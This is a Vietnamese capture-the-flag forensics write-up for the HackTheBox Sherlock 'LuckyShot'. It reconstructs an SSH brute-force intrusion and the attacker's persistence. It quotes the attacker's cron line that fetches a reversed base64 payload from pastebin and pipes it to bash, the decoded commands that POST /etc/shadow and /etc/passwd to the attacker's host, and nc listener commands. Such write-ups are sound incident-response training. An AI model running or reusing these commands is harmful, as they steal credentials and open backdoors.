---
title: LuckyShot

---

# LuckyShot

![image](https://hackmd.io/_uploads/ByJJfq3O-l.png)

Link đề: https://app.hackthebox.com/sherlocks/LuckyShot

Chúng ta được cung cấp 1 thư mục `root` của Linux, với việc điều tra xem máy của ông trưởng phòng này đã bị mất đi nhiều tập tin quan trọng. Và ông nghĩ mình đã bị xâm nhập.


### Task1: What method did the attacker use to gain access to the system?

Ở câu này, ban đầu mình định sẽ theo dõi theo lịch sử dùng lệnh `bash_hisotry.txt` trong thư mục administrator để có manh mối, nhưng không có kết quả gì.

Tiếp theo mình thấy được đây là chiếm lấy quyền truy cập vào hệ thống, vậy có thể 1 user khác đã đăng nhập vào hệ thống, nên mình sẽ check thử file `/var/log/auth.log` để xem sao

Sau khi export file ra, mình dùng lệnh `strings auth.log | grep -i "ssh"`, bởi vì mình thấy bên trong fils system của ông này, có 1 thư mục tên là ssh:

![image](https://hackmd.io/_uploads/BkgGw52u-x.png)

Kết quả là mình thấy được, có rất nhiều lượt thử đăng nhập thất bại từ cùng 1 địa chỉ ip: `192.168.161.198`

![image](https://hackmd.io/_uploads/HkWrw52_We.png)

![image](https://hackmd.io/_uploads/HynAPcnObg.png)

Và khi mình tìm tiếp, mình đã thấy kẻ tấn công đã có thể brute force thành công vào user `administrator` và đã mở được các phiên làm việc.

**Method use: brute force**

![image](https://hackmd.io/_uploads/ByMQO92uWe.png)

### Task2: At what time did the attacker successfully log in for the first time?

Dựa vào file `auth.log` này mình sẽ tiếp tục thực hiện lệnh `grep` và cũng đã có kết quả:

![image](https://hackmd.io/_uploads/H1-jd5hObe.png)

**First Time access: 2025-02-10 19:39:03**

### Task3: Which user account was compromised by the attacker?

Như chúng ta đã thấy thì attacker đã mở được 1 phiên làm việc bằng user `administrator`, sau khi brute force được mật khẩu của người dùng này.

**user: administrator**

![image](https://hackmd.io/_uploads/H147Fq2O-g.png)


### Task4: What command was executed by the attacker to check user privileges?

Lúc này chúng ta cần quay lại check file `bash_history.txt` xem kẻ tấn công đã thực hiện những lệnh gì.

![image](https://hackmd.io/_uploads/H1esF9hOZe.png)

`group administrator`, lệnh này cho phép attacker, có thể in ra tất cả những user được add vào đây, với quyền admin trong hệ thống.

![image](https://hackmd.io/_uploads/BJYTKqn_-l.png)

### Task5: What was the first tool the attacker downloaded to extract stored credentials from the system?

Tiếp tục kiểm tra file `bash_history.txt` chúng ta sẽ thấy attacker thực hiện tải về lệnh `git` sau đó hắn tải về 1 công cụ có tên là: **Lazagne.git** 

![image](https://hackmd.io/_uploads/Sk4Mccn_Ze.png)


![image](https://hackmd.io/_uploads/ryrBq9hOWg.png)

Khi mình lên mạng tìm hiểu thử, thì đây là 1 công cụ dùng để đánh cắp mật khẩu trong 1 máy tính nội bộ. 

**tools: lazagne**

![image](https://hackmd.io/_uploads/BkNFqq3dZx.png)

### Task6: The attacker located sensitive files on the compromised system and transferred them to a remote machine. Which command-line tool was used for this exfiltration?

![image](https://hackmd.io/_uploads/Sk7lo52_Zl.png)

Ở đây chúng ta thấy sau khi hắn thực hiện chạy công cụ `lazagne.py` xong và đã thu thập được mật khẩu, thì hắn tiếp tục tải về 1 mã nguồn khác từ github có tên là `mimipenguin.sh`.
> Mình lên mạng search thử về mã nguồn mimipenguin.sh này thử, và thấy nó cũng có 1 công cụ riêng, và tools này được dùng để dump ra các mật khẩu trong 1 máy nội bộ.
> 
> Có 1 điều đặc biệt ở đây là attacker sử dụng cả 2 tools chuyên dùng để gôm mật khẩu là Lazagne và mimipenguin.sh. Lý do ở đây là vì:
> - Tools Lazagne chỉ có thể thực hiện gom mật khẩu từ các tệp cơ sở dữ liệu của browser như (Chrome,Firefox), ứng dụng chat (Skype) và mail.
> - Còn đối với mimipenguin.sh, nó được thiết kế để dump mật khẩu từ trong RAM của máy tính nội bộ - giống với tools mimikatz của Windows.

Cuối cùng là hắn đã đưa mật khẩu đã đánh cắp được vào 2 file `Passwords_Backup.txt Server_Credentials.txt`, và gửi lên server bằng lệnh `scp` cho máy `kali@192.168.161.198`.

> scp (secure copy) là 1 lệnh cho phép sao chép tệp tin và thư mục từ máy này sang máy khác qua bảo mật mạng.

![image](https://hackmd.io/_uploads/r1t069n_bl.png)

### Task7: What IP did the attacker exfiltrate the files to?

Chính là địa chỉ ip **192.168.161.198**, mà attacker thực hiện copy file, và cũng là địa chỉ ip đã brute force được mật khẩu ssh để xâm nhập vào user `administrator`.

![image](https://hackmd.io/_uploads/B1mr0qh_-x.png)

### Task8: The attacker continued their exploitation and executed a malicious script on the victim machine. What is the name of the script?

Ở dưới mình thấy attacker đã thực hiện chuyển hướng vào thư mục `/tmp`, sau đó cấp quyền cho 1 script `sys_monitor.sh` và sudo chạy file khá đáng nghi trên máy của nạn nhân:

![image](https://hackmd.io/_uploads/Skqxkj2d-g.png)

**File script: sys_monitor.sh**

![image](https://hackmd.io/_uploads/r1OLes3_Zg.png)

### Task9: What is the SHA1 hash of the malware?

Mình đang khá rối, khi không còn tìm thấy thư mục `tmp` ở đâu nữa, và mình nghĩ rất có khả năng 1 số thư mục bị xóa đi mà ông này nói có bao gồm cả thư mục `/tmp`, nếu vậy thì khó để có thêm thông tin về script mã độc.

Nhưng mà mình thấy trong các thư mục được đưa cho có 1 thư mục là `hash_executables` mình xem thử thì nó lưu lại mã hash sha1 cho tất cả các file đã thực thi và cũng tìm được SHA1 hash cho malware:

```
3ae5dea716a4f7bfb18046bfba0553ea01021c75  /home/administrator/tmp/sys_monitor.sh
```

![image](https://hackmd.io/_uploads/SkRBWshd-x.png)


### Task10: The malware installed a component that pretends to be part of system network management but is actually running with root privileges. What is the name of the component?


Như mình suy nghĩ thì, đề có nói con malware nó đã tải xuống 1 ứng dụng giả vờ làm hệ thống quản lý mạng, nhưng chạy với quyền `root`, tức là mỗi khi nó chạy, thì nó phải dùng lệnh `sudo` và được ghi nhận là `root` trong hệ thống. Vậy thì mình sẽ sử dụng file `auth.log`, để tìm xem, ứng dụng mạng nào đã sử dụng quyền root và sudo để thực thi:

![image](https://hackmd.io/_uploads/B141Nj3OZe.png)

Đúng như mình suy nghĩ, thì mình đã tìm được tên và full path của phần mềm giả vờ này là: `/usr/bin/tee /etc/systemd/system/systemd-networkm.service`.

![image](https://hackmd.io/_uploads/SJ2OVsn_bg.png)

Hơn nữa thì thằng phần mềm này được thực thi bởi con mã độc đó `sys_monitor.sh`

Đây chính là 1 kĩ thuật giúp attacker có thể persistence trong máy của nạn nhân, khi dịch vụ mạng này chạy payload như một phần mềm hợp pháp.

**File name: systemd-networkm.service**

### Task11: The attacker modified several startup configuration files, each spawning a network listener on a different port at login. What is the name of the file that starts the listener on the lowest port number?

Để giải quyết được vấn đề tìm được cổng kết nối với máy attacker, thông qua những configuration file, thì mình cần tìm hiểu các configuration file quan trọng [ở đây](https://www.baeldung.com/linux/config-files)

Sau khi kiểm tra qua 1 lúc khá lâu thì mình có tìm được 1 lệnh `nc` trong file `.profiles` trong thư mục `/root`, và nó thực hiện chạy ngầm.

![image](https://hackmd.io/_uploads/Sk_Mwj2uWe.png)

Ở đây nó kết nối tại cổng `9000`

Tiếp theo trong thư mục `.ssh`, mình thấy attacker đang added SSH key cho `kali@kali`:

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCnoiT13BNG/mRCoizCTYQncnZkhm62c0WivVvTZ32FxGh+J8HzLcYnI3/FLPt2FfAkjXV1+LU+gLHtFossAIo4BfuZj7c1xwxbuEbGjD5sEYI9ayiIGV+NUM99zweVI2fVt18s0y99EHS1h94aqMT3J/J7hjbMhAuQC8ij295WReT3XvXkZ0U6YI/qFPoO7VnE4OPjq8Cgmfr7PXdpsLBs5FZ5qX6T9nWuU3yDSZWMLGyYMo0VlT1oY7fcUJyMRCjG9YHxFlGhX+136qLD+PlDWMaBJqVHfiTNyP8V4Yz9gitJ45veO6dPTa9sUHUe2LeNAVFmEgAvfaLyMZPBl6CEXzvtZbYH4Yld1U86tascPTXtLDdLipe2ElMisuld58gqWQYctkyuPTvkJwlZvxfVcFN0bA3uapEi2S3toQdoLJZO06UZxOJBBI2pjFIBJkJdiIpOzsvNPTs46hsmaIN97RHAWgm8fTd1yjXOiqoZlAo9Jujvh6KAuHiHANAuztSvC5IrgVWM5wiZBQRAVfrZanojjZr8ig22GEKupEuwCgNHc4V+VLj6ki0u5E6xeBEyhH9qZO3erK9xvqR5VMGqUnfa6qo9/ORaILj4CpX08/5He9JbgOIPpOOFEVm6e/AudL8PcPsE+oJwlXZFoyWoRyAd7CJBkbEaGHTjQ643Lw== kali@kali
```

Cuối cùng là file `.bashrc`, khá dài khi mình nghĩ nó không có, nhưng ở cuối file vẫn có 1 lệnh `nc` tại port `7575`.

Và sau 1 lúc lau tìm qua các file khác được liệt kê trong blog, và mình không tìm thấy được gì nữa cả, thì port nhỏ nhất mình tìm được là `nc -lvp 7575 &`

![image](https://hackmd.io/_uploads/SyW8uj2d-l.png)

### Task12: What is the username and hostname associated with the attacker?

Như mình đã tìm thấy bên trong file `authorized_keys` `kali@kali`, tức là username và hostname của attacker đều là kali. =)) 

![image](https://hackmd.io/_uploads/ByfpujhdZe.png)


### Task13: The attacker created a user for persistence, what is the name of the created user?

Mình có thấy bên trong file system của thư mục `/` còn có 1 user nữa trong `/home` là `Regev` nhưng trước tiên mình cần tìm bằng chứng, chứng tỏ rằng đây là 1 user dùng để persistence đã.

Mỗi 1 user được thêm vào hệ thống từ 1 user có quyền root, đều được ghi vào log của hệ thống trong `auth.log`, nên mình sẽ vào đây và check thử:

![image](https://hackmd.io/_uploads/B1hdYs2_Ze.png)

Như này là chuẩn rồi, được user `administrator` thêm đầy đủ các quyền sudo.

![image](https://hackmd.io/_uploads/ByS2Ks3Obl.png)

### Task14: At what exact timestamp was the new user created on the system?


Dựa vào log:
```
2025-02-10T20:11:21.783367+02:00 LuckyShot useradd[16903]: new user: name=Regev, UID=1001, GID=1001, home=/home/Regev, shell=/bin/bash, from=/dev/pts/3
```
Thì thời gian user này được thêm là: **2025-02-10T20:11:21**

![image](https://hackmd.io/_uploads/HkMrcj2dWe.png)

### Task15: The malware set up an automated process to fetch and execute a remote payload from a legitimate web service. What is the full command responsible for retrieving this payload?

Trong Linux, chúng ta cũng có 1 thư mục đùng để chứa tất cả các proccess được chạy tự động trong hệ thống bên trong thư mục `/etc/cron.b`

![image](https://hackmd.io/_uploads/rJIXjihdZe.png)

Và lệnh dùng để tải về một payload từ nguồn `Pastein.com` là đây:

```
/1 * * * root command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash
```

>Mình sẽ bóc tách 1 tí về kỹ thuật được sử dụng trong đoạn code này và logic của nó.
>
> Đầu tiên nó dùng lệnh `*/1 * * * *` để thiết lập chạy 1/phut.
>
> `command -v curl >/dev/null 2>&1` Lệnh này đầu tiên kiểm tra `curl` đã được cài đặt chưa, sau đó dùng `>/dev/null 2>&1` để ẩn hết các thông báo lỗi và kết quả trả về.
> 
> Cuối cùng là thực thi lệnh tải về payload: `curl -fsSL https://pastebin.com/raw/SAuEez0S` ở đây 1 plugins đi kèm có tác dụng là:
> - `-f` không hiển thị lỗi HTTP.
> - `-s` ở mode silent.
> - `-L` tự động chuyển hướng.
> 
> Cuối cùng là các bước lần lượt là dùng lệnh `rev` để đảo ngược chuỗi vừa tải về,  giải mã chuỗi, và thực thi.

Mình có lên mạng và tìm kiếm thử chuỗi này vì, mình đã lục trong các thư mục của máy nạn nhân nhưng không thấy:

```
=AHaw5CbhVGdz9CO5EjLxYTMugjNx4iM5EzLvoDc0RHag0CQgQWLgQ1UPBFIY1CIsJXdjBCfgQ2dzNXYw9yY0V2LgQjNlNXYipQDwhGcuwWYlR3cvgTOx4SM2EjL4YTMuITOx8yL6AHd0hGItAEIk1CIUN1TQBCWtACbyV3YgwHI39GZhh2cvMGdl9CI0YTZzFmY
```

Thực hiện theo đúng lệnh `bash` đã của attacker thực hiện:

![image](https://hackmd.io/_uploads/rysSJ3h_be.png)

```
base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php
base64 /etc/passwd | curl -X POST -d @- http://192.168.161.198/steal.php
```

Attacker thực hiện mã hóa 2 file `/etc/shadow` và `/etc/passwd` sau đó thực hiện request POST lên cho server `192.168.161.198`.

### Task 16: The payload was used to extract more sensitive files. What was the command ran to extract the more sensitive file?

Mình nghĩ trong 2 file `/etc/shadow` và `/etc/passwd`, thì việc shadow nó chứa hash mật khẩu và tên người dùng của tất cả các user trong hệ thống sẽ nguy hiểm hơn, nên mình sử dụng 

```
base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php
```
![image](https://hackmd.io/_uploads/Hk85gh2O-x.png)

# Technique

Trong bài này, mình học được 1 vài kĩ thuật persistence khá mới mà trước đây mình chưa từng nghe tới, là persistence bên trong 1 file giả danh quản lý mạng, và duy trì việc thực thi mã độc trong `cron.d`, mặc dù chúng ta cũng biết được việc cron là chức năng dùng để chạy các proccess một cách tự động trong Linux, nhưng đây là lần đầu mình đụng tới trường hợp này nên mình vẫn sẽ note lại.

### Persistence systemd-networkm.service

Kẻ tấn công tạo ra 1 script mã độc, đồng thời còn thực hiện sinh ra 1 phần mềm giả dạng giám sát mạng biến nó thành 1 dịch vụ hệ thống (system service), bên trong phần mềm này cũng được cấu hình rất mạnh mẽ, và khó để xóa đi:

- `ExecStart=/bin/bash /tmp/sys_monitor.sh`, cho chúng ta biết được phần mềm này sẽ thực hiện chạy lệnh `bash script ./sys_monitor`.
- Quan trọng hơn là 2 cấu hình giúp nó duy trì persistence rất mạnh trong hệ thống là:

```
Restart=always
User=root
```

Cho phép attacker thực thi script với quyền cao nhất, và luôn luôn chạy, nếu nó có vô tình bị dừng lại.

### Cron Job (Scheduled Task & Obfuscation)

Đây là kĩ thuật không mới, nhưng với việc lần đầu mình tiếp cận, mình vẫn sẽ note về nó để có thể xem lại:

- Đầu tiên chúng ta nói về **(Persistence - MITRE T1053.003):** Thay vì chỉ cài mã độc một lần rồi thôi, hắn đặt lịch (*/1 * * * *) để cứ mỗi phút một lần, hệ thống sẽ tự động thực thi lại quy trình lây nhiễm với quyền root. Điều này khiến việc thanh lọc hệ thống 
trở nên vô cùng khó khăn.

- Tiếp theo trong mã độc được thực hiện trong `cron` còn có 1 khả năng tự update và install lệnh `curl` nếu nó có bị xóa đi.

- **(Evasion - MITRE T1027):** kẻ tấn công tạo 1 payload với đoạn mã base64 đã bị đảo ngược lại, đối với các hệ thống diệt virus, nó sẽ khó để nhận diện được để xóa đi các payload này.

- Cuối cùng vẫn là kĩ thuật (Fileless Execution) kẻ tấn công dùng lệnh `bash` để thực hiện chạy lệnh ngay lập tức, mà không phải ghi bất kì file nào vào RAM, vì như thế có thể sẽ bị phát hiện.











